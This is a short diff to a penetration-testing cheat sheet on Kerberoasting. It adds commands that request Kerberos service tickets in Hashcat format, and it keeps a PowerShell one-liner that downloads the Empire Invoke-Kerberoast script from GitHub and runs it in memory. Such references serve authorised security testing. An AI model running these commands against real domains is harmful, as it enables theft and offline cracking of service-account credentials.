@@ -51,6 +51,11 @@ Request-SPNTicket -SPN "<SPN>" -Format Hashcat
 ```     
 Using Invoke-Kerberoast:    
 `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat`   
+Single ticket from Invoke-Kerberoast:   
+`Get-DomainSPNTicket -SPN "HTTP/SA-SPS" -OutputFormat Hashcat`   
+
+Get ticket using klist:   
+`klist get <SPN>`   
 
 ### From Linux
 Using GetUserSPN.py:   
